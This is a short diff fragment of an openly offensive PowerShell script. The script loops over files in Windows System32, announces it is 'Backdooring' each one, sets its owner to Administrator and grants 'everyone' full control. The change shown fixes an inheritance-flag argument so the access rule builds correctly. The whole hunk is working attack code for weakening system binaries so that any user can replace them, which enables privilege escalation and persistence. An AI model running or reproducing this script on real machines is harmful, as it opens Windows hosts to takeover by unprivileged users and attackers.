@@ -7,7 +7,7 @@ foreach ($element in $bin){
     Write-Host "[*] Backdooring $element" -ForegroundColor Green
 
     $Acl = Get-Acl "C:\Windows\System32\$element"
-    $Ar = New-Object System.Security.AccessControl.FileSystemAccessRule("everyone","full","noneifc","none","Allow")
+    $Ar = New-Object System.Security.AccessControl.FileSystemAccessRule("everyone","full","none","none","Allow")
     $Group = New-Object System.Security.Principal.NTAccount("Administrator")
     $Acl.SetOwner($Group)
     $Acl.AddAccessRule($Ar)
